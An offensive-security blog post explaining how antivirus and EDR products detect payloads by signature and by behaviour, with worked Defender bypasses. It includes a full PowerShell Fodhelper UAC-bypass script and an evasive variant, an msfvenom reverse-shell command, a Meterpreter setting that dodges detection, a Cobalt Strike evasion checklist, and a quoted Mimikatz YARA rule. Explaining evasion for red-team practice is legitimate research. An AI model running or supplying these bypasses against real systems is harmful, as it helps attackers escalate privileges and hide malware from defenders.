# https://s3cur3th1ssh1t.github.io/Signature_vs_Behaviour/

In this blog post, the main difference between signature-based and behavior-based Detections are explained. In addition, examples are shown with respective Detection bypasses.

After publishing my [Packer](https://twitter.com/ShitSecure/status/1482428360500383755), more and more people asked me about why for example `MSF-` or `CobaltStrike- (CS)`-Payloads were still detected. Well, in the very first place the easy answer is, that there is:

- A signature-based Detection, which was bypassed
- A behaviour-based Detection, which was triggered and killed the Process.

There are multiple Detection-techniques, which a Packer **can** bypass and there are others, which technically **cannot** get bypassed. Writing a blog post about this topic is at least for me the easiest way to answer this, as in the future I can just send one link for these kind of questions. ;-)

Using my private Packer will result in an `antiScan.me` result like this for `MSF`-Packed Payloads:

![](https://s3cur3th1ssh1t.github.io/assets/posts/SignatureBehaviour/AntiScanMe.JPG)

But this **does not** mean, the Payload will not get detected from those AV-Vendors when executed **on Runtime**. Why? Keep reading.

## Signature-based Detections

Signature-based Detections are very simple. The very first AV solutions had a signature database with _File-Hashes_ and they just compared the Hash of any executable on disk with the _known malicious executable_ softwares Hash. E.g. this database contained the SHA1/MD5 Hash of the release binary for _Mimikatz_. Changing the Hash of an executable is as simple as **manipulating** a single byte in it, so this Detection is not really reliable and at least I hope not commonly used anymore anyway in 2022.

Because of the fact, that this is **not reliable** vendors moved to detecting specific **byte pattern** signatures as alternative. So to stay with the example of Mimikatz specific **byte patterns/hex values** are flagged like:

```
73 00 65 00 6B 00 75 00 72 00 6C 00 73 00 61 00 5F 00 6D 00 69 00 6E 00 69 00 64 00 75 00 6D 00 70
--> HEX values for s.e.k.u.r.l.s.a._.m.i.n.i.d.u.m.p
```

![](https://s3cur3th1ssh1t.github.io/assets/posts/SignatureBehaviour/MimikatzHex.JPG)

It just makes sense here to not only flag one pattern per _known malicious binary/payload_ but to use multiple common patterns. Mimikatz is always a good example for signature-based Detections as typically vendors have dozens of patterns for Mimikatz binary Detections. By doing is this way, they make sure, that also slightly modified versions get detected.

Even more advanced Detections can be build with [yara rules](https://github.com/Yara-Rules/rules). These rules can either Scan **files** or **Memory contents** and allow much more complex conditions and combinations of different patterns. An example Mimikatz yara rule looks like this:

[Elastic Mimikatz Yara rule](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Hacktool_Mimikatz.yar)

```
rule Windows_Hacktool_Mimikatz_1388212a {
    meta:
        author = "Elastic Security"
        id = "1388212a-2146-4565-b93d-4555a110364f"
        fingerprint = "dbbdc492c07e3b95d677044751ee4365ec39244e300db9047ac224029dfe6ab7"
        creation_date = "2021-04-13"
        last_modified = "2021-08-23"
        threat_name = "Windows.Hacktool.Mimikatz"
        reference_sample = "66b4a0681cae02c302a9b6f1d611ac2df8c519d6024abdb506b4b166b93f636a"
        severity = 100
        arch_context = "x86"
        Scan_context = "file, Memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $a1 = "   Password: %s" wide fullword
        $a2 = "  * Session Key   : 0x%08x - %s" wide fullword
        $a3 = "   * Injecting ticket : " wide fullword
        $a4 = " ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )" wide fullword
        $a5 = "Remove mimikatz driver (mimidrv)" wide fullword
        $a6 = "mimikatz(commandline) # %s" wide fullword
        $a7 = "  Password: %s" wide fullword
        $a8 = " - SCardControl(FEATURE_CCID_ESC_COMMAND)" wide fullword
        $a9 = " * to 0 will take all 'cmd' and 'mimikatz' Process" wide fullword
        $a10 = "** Pass The Ticket **" wide fullword
        $a11 = "-> Ticket : %s" wide fullword
        $a12 = "Busylight Lync model (with bootloader)" wide fullword
        $a13 = "mimikatz.log" wide fullword
        $a14 = "Log mimikatz input/output to file" wide fullword
        $a15 = "ERROR kuhl_m_dpapi_masterkey ; kull_m_dpapi_unprotect_domainkey_with_key" wide fullword
        $a16 = "ERROR kuhl_m_lsadump_dcshadow ; unable to start the server: %08x" wide fullword
        $a17 = "ERROR kuhl_m_sekurlsa_pth ; GetTokenInformation (0x%08x)" wide fullword
        $a18 = "ERROR mimikatz_doLocal ; \"%s\" module not found !" wide fullword
        $a19 = "Install and/or start mimikatz driver (mimidrv)" wide fullword
        $a20 = "Target: %hhu (0x%02x - %s)" wide fullword
        $a21 = "mimikatz Ho, hey! I'm a DC :)" wide fullword
        $a22 = "mimikatz service (mimikatzsvc)" wide fullword
        $a23 = "[masterkey] with DPAPI_SYSTEM (machine, then user): " wide fullword
        $a24 = "$http://blog.gentilkiwi.com/mimikatz 0" ascii fullword
        $a25 = " * Username : %wZ" wide fullword
    condition:
        3 of ($a*)
}
```

So in this case if three of the mentioned strings are found either **in a file** or **in Memory** this rule will trigger and the AV/EDR Software can do an action like alerting or killing the Process. Detections like this can for example bypassed with the technique I described in my [Building a custom Mimikatz binary](https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/) blog post.

## The inner workings of a Packer

It is important to understand how a Packer basically works to get an idea of what it **can** do and what **is not** possible. In the very end, it is about a Software, which wraps a Payload into another Program to avoid **signature-based** Detections for it. So if a Payload like Mimikatz contained specific Strings, these Strings will not be visible anymore in the resulting Binary. The wrapping Process can be done with either some encoding/obfuscation or with encryption. I’m personally preferring to encrypt the Payload, as this will result in the best randomness - and therefore least signature-based Detections.

![](https://s3cur3th1ssh1t.github.io/assets/posts/SignatureBehaviour/Packer.png)

This encoded or encrypted Payload has to be **decoded/decrypted** in the resulting Loader-Program, so that the cleartext Payload can get executed **from Memory**.

Depending on the Payload, it is possible for a Packer to also get rid of more Detections **in the current** or **remote Process**:

1. If your Packer is **Patching/bypassing AMSI**, you can safely execute different **known malicious** Scripts (PS1,VBA,JS and so on) or C# assemblies from Memory.
2. To get rid of [ETW based Detections](https://github.com/xuanxuan0/TiEtwAgent), a Packer can also **Patch/bypass ETW** via different published techniques.
3. Hooking based Detections for Win32 APIs can be bypassed with e.G. unhooking or direct/indirect Syscall usage.
4. [Entropy based Detections](https://practicalsecurityanalytics.com/file-entropy/) will detect many Packers, as encryption of a Payload will lead to a very high entropy due to the randomness. This can be bypassed for example by adding thousands of words into the resulting Binary, as this decreases the entropy again.

My private Packer also makes use of all of these things mentioned.

But even if all these techniques are applied, there are more potential “problems” left:

1. Memory Scans
2. Behavioural Detections
3. Threat Hunters / Blue Team

In general it is possible to also bypass Memory Scans with a Packer, but this is very limited as you will see later on.

## Memory Scans and general bypass techniques

As signature-based Detections can easily get bypassed with the Packer technique, more and more AV/EDR vendors tend to also do Memory Analysis with Scans. These Scans are typically not done all the time over all Processes, as this would be too resource-consuming, but can be triggered by specific conditions.

A Memory Scan for example typically appears in the following situations:

- A new Process is spawned, e.G. running an executable
- The behaviour of a Process triggers a Memory Scan

The first one is trivial to bypass. Even a Packer can for example just sleep a given time **before** decoding/decrypting the real Payload. In that case, the Memory Scan will take place but won’t find anything, as the Payload is still encrypted.
There are ways to still detect **Win32 Sleep** based Memory Scan bypasses, for example [demonstrated here](https://github.com/ZeroMemoryEx/SleepKiller). As an alternative to using `Sleep` you could therefore also execute pseudo-code for a specific amount of time or do calculations. There are many alternatives to using `Sleep`.

But in general, there are different approaches to bypass Memory Scans:

- Changing/modifying the source code of your Payload to avoid signature-based Detections
- Changing the behaviour of your Payload, so that the Memory Scan will never trigger at all
- Memory encryption

I personally prefer the first option, it’s one time effort per Software and as long as the new code base is not made public, it should also not get detected in the future.

Bypassing behavior-based Memory Scans is harder depending on _what your Payload is doing_. Just imagine the behaviour of Mimikatz (for example opening up a Handle to LSASS with `OpenProcess`) triggers a Scan - in this moment there is no way to hide Mimikatz from Memory as it **needs** to be unencrypted to do it’s work. So Memory encryption will not be an option for Mimikatz. And don’t get my wrong, I would not recommend to use Mimikatz for LSASS dumping in 2022 anyway [as mentioned here](https://s3cur3th1ssh1t.github.io/Reflective-Dump-Tools/). It’s just a good example to understand it.

For **well known** C2-Frameworks like Cobalt Strike the most common option is Memory encryption. But if you don’t have access to source code, it’s not possible anyway to modify that to avoid Memory Detections. `¯\_(ツ)_/¯`
C2-Frameworks in general are a good candidate for this technique, as they Sleep most of the time. And if a program doesn’t do anything, it’s Memory content can get encrypted in that time-frame without any problems.

## Behaviour-based Detections - some examples and bypasses

But which behaviours could trigger an AV/EDR action or a Memory Scan on runtime? This can basically be everything. Writing stuff into Memory, loading specific libraries in a specific order and/or time-frame, creating registry entries, do initial HTTP requests or any other action.

I’ll give some few examples here with corresponding bypass techniques for Defender.

From my personal experience the least common **action** an AV/EDR does **after** detecting a specific **behaviour** is _instantly_ killing the Process. Why is that? Well, AV/EDR vendors don’t want to have too many false positive findings. As false positive findings with the action of killing a Process can lead to disruptions in production environments which is really bad. So they need to be nearly 100% sure, that a behaviour is definitely Malware to kill the corresponding Process. This is also the reason, why many vendors combine the Detection of a behaviour with a Memory Scan afterwards to **verify** they found something Malicious.

### Fodhelper UAC Bypass example

One good example for a behaviour-based Detection, which leads to an AV action is the Fodhelper UAC bypass with Windows Defender. This one is really well known, but also very easy to exploit, as it’s just about creating a Registry Entry and calling `fodhelper.exe` afterwards:

```
<#
.SYNOPSIS
    This script can bypass User Access Control (UAC) via fodhelper.exe

    It creates a new registry structure in: "HKCU:\Software\Classes\ms-settings\" to perform UAC bypass and starts
    an elevated command prompt.

.NOTES
    Function   : FodhelperUACBypass
    File Name  : FodhelperUACBypass.ps1
    Author     : netbiosX. - pentestlab.blog

.LINKS
    https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692
    https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/

.EXAMPLE

     Load "cmd /c start C:\Windows\System32\cmd.exe" (it's default):
     FodhelperUACBypass

     Load specific application:
     FodhelperUACBypass -Program "cmd.exe"
     FodhelperUACBypass -Program "cmd.exe /c powershell.exe"
#>

function FodhelperUACBypass(){
 Param (

        [String]$Program = "cmd /c start C:\Windows\System32\cmd.exe" #default
       )

    #Create Registry Structure
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $Program -Force

    #Start fodhelper.exe
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    #Cleanup
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

}
```

[This code snipped was taken from here](https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692)

Executing this with Defender enabled will lead to the following Detection:

![](https://s3cur3th1ssh1t.github.io/assets/posts/SignatureBehaviour/FodhelperDetection.JPG)

This alert neither kills the executing nor the newly spawned Process, but can still lead to Detections in any engagement. The Detection itself **cannot** be bypassed with an AMSI bypass and Patching ETW also **doesn’t** help. Because it’s a specific behaviour triggering this Alert.

I did some light Analysis with trial and error about what specifically is flagged here and found out, that Defender does not like any **.exe** in the _HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command(Default)_ entry as well as the Directories _\*C:\\windows\\system32\*_ and _\*C:\\windows\\syswow64\*_.

So the behaviour, which triggers an Alert is **creating a Registry Entry** in the mentioned Directory **with** one of the Strings.

Luckily for us, we don’t need to specify **.exe** to execute a Binary and also both Directories are not necessarily needed for exploitation. So as an alternative, we could just copy e.G. a C2-Stager into any writable Directory and execute it with the UAC-Bypass without calling the extension.

```
FodhelperUACBypass -Program C:\temp\stager # Real filename is stager.exe but this would trigger an alert.
```

But in 2022, many OffSec People will have gotten aware of the fact, that running any unsigned executables on a system with AV/EDR installed might not be a very good idea. So as an alternative we could also execute any signed **trusted** executable and drop a corresponding Sideloading-DLL into the same directory. Third option: we can copy _rundll32.exe_ into our writable Directory and execute it from there:

```
function FodhelperUACBypass(){
 Param (

        [String]$run = "C:\temp\peng C:\temp\calc.dll,NimMain" #NimMain only for Nim Dlls ;-)
       )
    # Copy C:\windows\system32\rundll32.exe to C:\temp\Peng.exe
    copy C:\windows\system32\rundll32.exe C:\temp\Peng.exe
    #Create Registry Structure
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $run -Force
    #Start fodhelper.exe
    Start-Process "C:\Windows\System32\fodhelper.exe"
    #Cleanup
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}
```

### Meterpreter behaviour-based Detections

As many people also asked me about why their `MSF`-Payloads still get flagged, I decided to also show some (nothing new, everything already published somewhere) background information about that.

First things first: Don’t use staged Payloads, they will always get caught at least by Defender and I don’t plan to modify the source Code of Meterpreter in this post. ;-)

So in our case we’ll generate _stageless_ reverse-HTTPS Shellcode for execution. This can be done for example with the following command:

```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=(IP Address) LPORT=(Your Port) -f raw > Shellcode.bin
```

I will not cover the _stealth_ way of executing this Shellcode here, as I want to show the behavioural Detection but in general you’ll need the following:

1. Encrypt the Shellcode and decrypt it on runtime to avoid signatures on disk or as alternative load it from a remote Web-Server on runtime
2. Use direct or indirect Syscalls for execution, otherwise the Shellcode will get flagged **before** execution

No need for Patching AMSI/ETW to get Meterpreter running in this case.

But even if you were bypassing the signature-based Detection on disk **and** the Shellcode Detection with Syscalls, you should be able to see one new Meterpreter Session incoming:

![](https://s3cur3th1ssh1t.github.io/assets/posts/SignatureBehaviour/MSFIncoming.JPG)

But this just means, that our initial Payload was executed successfully. One second later, the Process is killed and the following Detection appears:

![](https://s3cur3th1ssh1t.github.io/assets/posts/SignatureBehaviour/Meterpreter_Behaviour.JPG)

And again, this is a behaviour-based Detection, which is triggered by additional DLL files, loaded via plain Win32 APIs and [reflective DLL-Injection](https://github.com/rapid7/ReflectiveDLLInjection/tree/fac3adab1187deade60eef27be8423ee117c1e1f) technique. In this case, the Injection of the stdapi-DLL triggered an Alert.

In the _msfconsole_ prompt, you can pass the following command to disable loading of the [stdapi DLL](https://github.com/rapid7/metasploit-Payloads/tree/master/c/meterpreter/source/extensions/stdapi):

```
set autoloadstdapi false
```

After doing that, you should be pretty fine getting your Meterpreter Session incoming:

![](https://s3cur3th1ssh1t.github.io/assets/posts/SignatureBehaviour/NoMetDetection.JPG)

Disabling stdapi loading will, however lead to you having nearly no commands/modules in your Meterpreter-Session and only the “Core Commands” will be available.

After waiting some minutes, you can load stdapi manually with the following command and there should be still no Detection:

![](https://s3cur3th1ssh1t.github.io/assets/posts/SignatureBehaviour/LoadStdAPI.JPG)

What is this behaviour-based Detection about? I cannot tell 100% for sure, but it’s most likely the combination of:

- A newly spawned Process
- Timeframe x for the new Process till specific Windows APIs for reflective loading of a DLL are called
- A Memory Scan, to verify malicious content
- Detection of Meterpreter in Memory and the action of killing the Process

Note: This is only ONE possible way to bypass Defenders Meterpreter behaviour-based Detection. And I’m assuming, that the Microsoft Defender Team will add additional checks after the publication of this post, as this happened for some other of my Videos or Posts. So at some point you’ll need to dig into alternatives yourself. My primary goal is not to explain how to get Meterpreter to work, but to give you an understanding about what happens.

As already mentioned in this post above, one general way to bypass Memory Scans is modification of the source code to avoid signatures in Memory. As this behaviour-based Detection - like **many** other **C2-Payload** Detections - is verified by a Memory Scan, it’s another option here to modify the source code. One automated approach for Meterpreter source code obfuscation was published [in this blog post](https://blog.scrt.ch/2022/04/19/3432/). We did go that route at work - with additional manual modifications - and were able to avoid this Detection with autostdapi-Loading enabled. If you want to do that, be prepared to spend some days with the Meterpreter Code base.

The third way - Memory encryption - it not that easy to accomplish for Meterpreter, as the HTTP/HTTPS source code does not function like many other C2-Frameworks in terms of Sleeping for time-frame x before asking for commands. It’s just about throwing out many HTTP(S) requests with small delays in between. So Memory Encryption would disrupt this Process. If you want to go this route, you would therefore need to integrate a custom Sleep-function with Memory encryption in the source code yourself.

### Cobalt Strike Detections and my personal Journey with them

Cobalt Strike is most likely the **most sigged** and most **in depth analysed** C2-Framework out there. This is most likely due to the fact, that it was ab(used) by many different threat-actors in the wild for the last years. Not changing default settings will not be usable in the most environments, as this will instantly get detected.

Even using a custom Packer/Loader with Syscalls for the Shellcode execution will in many environments still fail. So I’m going to explain at least the **very minimum** requirements and modifications you will need to do as operator when using this Framework. I’m not a Cobalt Strike professional user in any way, it’s just one year of experience with it - reading all of the documentations and trying out different tools/setups. So I might miss some things, that more experienced Operators are using.

C2-Server/Infrastructure minimum requirements:

1. **Disable** staging in the Malleable profile - if it’s enabled your Implant will get burned almost instantly, as there are many Internet wide automated Scanners which download the second stage to analyze and share it.
2. You **have to** use a custom Malleable C2-Profile with many different important evasion settings to get rid of at least _some_ Detections. I had good experience with [SourcePoint](https://github.com/Tylous/SourcePoint) generated Profiles myself.
3. It’s **nessesary** to use a redirector in front of the C2-Server. This redirector should drop/block known Sandbox analysis IP-ranges and only allow and redirect those requests, that comply with the Malleable C2 profile. Good example tools to automate this Process are [RedWarden](https://github.com/mgeeky/RedWarden) or [RedGuard](https://github.com/wikiZ/RedGuard). Not using this technique will likely lead to your implant getting burned. **Fingerprinting** and Detection of the Cobalt Strike server **after the first Connection** as mentioned for example in [this MDSec blog post](https://www.mdsec.co.uk/2022/07/part-2-how-i-met-your-beacon-cobalt-strike/) can also be avoided with it.

Implant minimum requirements:

1. Use Encryption/Obfuscation and Runtime-Decryption/De-obfuscation to Pack the Shellcode. If you don’t do that, your Loader will get flagged by Signature on disk or in Memory (depending on how you load it)
2. Use direct or indirect Syscalls to execute CS-Shellcode or to load the artifact from Memory. Not doing that will lead to instant Detections in most environments, as the Shellcode always has the same IoCs and will get detected by AV/EDR hooks very easy.
3. Use [environmental keying](https://attack.mitre.org/techniques/T1480/001/) to bypass potential Sandbox- or automated EDR Cloud-Submission-Analysis.
4. You **have to** modify the default Sleep mask template in Cobalt Strike via the Arsenal Kit. If enabled in the Malleable C2-Profile, the Beacon will encrypt both Heap and Stack Memory to hide itself from Memory Scanners **after** successful execution. But as this default Sleep mask source Code **itself** is also heavily targeted by AV/EDR signatures and will therefore also get flagged by Memory Scanners. You **should not** use any unmodified public Github Sleep encryption code for that, as this will also get flagged.

All of these points (except the Sleep Mask modifications) can be done either by a completely custom Packer/Loader or with the Arsenal Kit, which already provides a lot of template code to start with. If you’re planning to use the Arsenal Kit you **have to** get familiar with C/C++ and do **heavy** customizations to the template code to get rid of Detections (That’s at least what other people in the community told me, which went this route). I personally always used raw-Shellcode output and my own private custom Packer/Loader to implement the things mentioned above.

The Sleep Mask modifications also apply to raw-Shellcode output, so you’re even fine modifying that in the Arsenal Kit when using your own custom Loader. I got CS running against Defender with the mentioned modifications, however, Defender for Endpoint did still did detect many behaviours in my testings.

Note: Even if you applied all of the mentioned requirements, your implant can still get detected in mature environments. Depending on which EDR is used in your target environment, it’s just not enough. There are still some problems left:

1. Don’t think you won, if you got an incoming Beacon connection. In many environments I was able to get a Beacon to run, but after issuing a **single** command/module the implant was instantly detected and killed. As I said, CS is most probably the most sigged Framework out there, take a look at [for example these yara rules](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar) and you will see, that vendors did implement Detection rules for nearly **every** command/module. These behaviour-based detections made me personally using Cobalt Strike **only** to initiate a reverse Socks Connection and nothing more to avoid local system IoCs and do everything over the network via socks. So in many of my projects Cobalt Strike more or less became a standalone socks5 reverse proxy software.
2. There might be a Blue Team and/or Threat hunters in your target environment. Even simple IoCs can lead to a manual analysis/review. In that case you will need to be aware of many more deeper evasion techniques. For automated AV/EDR analysis, a simple Memory encryption might be fine, but in this case you will need to avoid many more IoC’s like RWX/RX Memory permissions, you cannot use Win32 Sleep as that’s easy to detect and many more things to mention. Take a look at [this post](https://blog.kyleavery.com/posts/avoiding-memory-scanners/) and the linked references/tools to get an idea about the topic.
3. In some environments my Beacon/Process was even detected before calling back. I cannot tell what these Detections were about and I had no clue about how to bypass them to be honest.

Some more experienced Cobalt Strike users hinted me to the nearly endless possibilities of User defined reflective Loaders (UDRL) such as [TitanLdr](https://github.com/SecIdiot/TitanLdr). Tweaking the Cobalt Strike behaviour via the Malleable Profile options is in mature environments not enough. The Core for example will always use Win32 APIs (with potential Detections) instead of direct Syscalls. Until someone integrates a Syscall option with an Update. But with UDRL’s you can also modify all of the Cobalt Strike Core behaviour by using Import Address Table Hooks. You could for example Hook _VirtualProtect_ of the Core to become _NtProtectVirtualMemory_.

So instead of using a Custom Packer/Loader or the Arsenal Kit with modifications it _might be_ the stealthiest way to stick with UDRL’s due to the current limitations of the CS-Core itself.

For me personally, this was not an option anymore. Hooking the IAT to modify a closed source softwares Core only to bypass behaviour-based Detections? At some point I decided to at least for this moment not dig deeper and deeper into Windows Internals just to get a C2-Connection with this Framework to run. After one year of having only a very few environments with no Detections and some with a reverse Socks proxy I decided to use other Frameworks. I was always fine without CS before and it will be fine in the future again.

### Is all of this evasion-techniques really needed?

I would like to include a fundamental question in this post. Is all of this really needed? Is it **needed** to use Syscalls? Is it **needed** to use Memory encryption? Is it **needed** to unhook all the things? Is it **needed** to bypass AMSI or ETW? Is this tool which is known malicious worth the additional evasion effort?

The very simple answer to this from my current knowledge and point of view is - **no**! Why not? Well, I think the InfoSec Industry really pushed each other to more and more and new limits over all these years. But all these evasion techniques are somehow still _just_ used to bypass signatures.

If you’re using self-generated Shellcode, it’s an option to stick to Win32 APIs again. _WriteProcessMemory_ or _CreateThread_ will lead to Detections of the input arguments and to an analysis of the Shellcode-Entrypoint. But if that has no _known malicious signature_, it will run fine and not get blocked.

If you’re using In-House-Tooling or heavily modified Open Source code, AMSI will never catch you because it’s searching for _known signatures_.

If you’re using an heavily obfuscated OpenSource C2-Framework or again a self developed one - Memory Scans won’t catch you. Of course, you don’t want to give a plain C2-Stager from Memory to the Blue Team as present, so using encryption still makes sense in that case.

This is of course a very hypothetical world. Most IT-Security Consulting companies don’t spend that much time and money into development and research which would make this conditions apply. Threat-Actors will also have a budget limit. Therefore most stick to either OpenSource tools or commercial Software, because this saves time and money.

But from my point of view people should be aware of this fact, as for many tools heavy modifications are one-time effort. As long as you don’t publish the code. If you spend some hours into modifications for years every week, you may not need to bypass AMSI anytime anymore. If you developed an in-house-C2, you don’t **nessesarily** need to care about _some_ evasion techniques.

What do you think?

## Conclusion

On the one hand, I wanted to use this article to give an overview of what a Packer **can** technically bypass and at what point the **Operator** has to take action **himself**. Some things should hopefully be clear:

- The Operator should know what his Payload is doing
- The Operator should know about the Indicators of Compromise (IoCs) for his Payloads
- Behaviour-based Detections can only get bypassed by the Operator himself via Payload modification

On the other hand I showed some examples on how to bypass behaviour-based Detections from Defender for

- The Fodhelper UAC Bypass
- Meterpreter
- Cobalt Strike

For Cobalt Strike detections in other mature environments - well at some point I stopped digging deeper as it was just too much of a BlackBox for me. I’m still excited about it’s future development and will follow all those changes. Who knows, maybe someday I’ll pick it up again.

The post ended up with the fundamental question about if all this stuff is even needed at all. Sometimes you will not get around it because the software/tool is closed source and known malicious. I personally think, that it’s not. But this _just_ depends on which Payload you’re using. With custom tools or obfuscation many evasion techniques should not be needed at all. But as custom tools or heavy modification for each tool needs a lot of effort, the alternative of more and more evasion techniques has to be accepted in many cases. At one point you just have to question yourself, if additional effort for evasion is worth getting a known malicious Payload to work. I’m curious, where this pushing will lead to in the next years. Maybe there will be a Point at some time, where people prefer more one-time-effort against a constant up-to-date evasion practice.

## Links & Resources

- Yara [https://github.com/Yara-Rules/rules](https://github.com/Yara-Rules/rules)
- Elastic Mimikatz Yara rule [https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows\_Hacktool\_Mimikatz.yar](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Hacktool_Mimikatz.yar)
- Entropy based Detections [https://practicalsecurityanalytics.com/file-entropy/](https://practicalsecurityanalytics.com/file-entropy/)
- SleepKiller [https://github.com/ZeroMemoryEx/SleepKiller](https://github.com/ZeroMemoryEx/SleepKiller)
- Fodhelper UAC Bypass [https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/)
- Reflective DLL Injection [https://github.com/rapid7/ReflectiveDLLInjection/tree/fac3adab1187deade60eef27be8423ee117c1e1f](https://github.com/rapid7/ReflectiveDLLInjection/tree/fac3adab1187deade60eef27be8423ee117c1e1f)
- Meterpreter stdapi [https://github.com/rapid7/metasploit-Payloads/tree/master/c/meterpreter/source/extensions/stdapi](https://github.com/rapid7/metasploit-Payloads/tree/master/c/meterpreter/source/extensions/stdapi)
- Engineering antivirus evasion (Part III) [https://blog.scrt.ch/2022/04/19/3432/](https://blog.scrt.ch/2022/04/19/3432/)
- Environmental Keying [https://attack.mitre.org/techniques/T1480/001/](https://attack.mitre.org/techniques/T1480/001/)
- Cobalt Strike Yara rules [https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows\_Trojan\_CobaltStrike.yar](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar)
- Avoiding Memory Scanners [https://blog.kyleavery.com/posts/avoiding-Memory-Scanners/](https://blog.kyleavery.com/posts/avoiding-memory-scanners/)
- TitanLdr [https://github.com/SecIdiot/TitanLdr](https://github.com/SecIdiot/TitanLdr)

If you like what I'm doing consider -->

[Sponsor](https://github.com/sponsors/S3cur3Th1sSh1t?o=esb)

 <\-\- or [become a Patron](https://www.patreon.com/S3cur3Th1sSh1t) for a coffee or beer.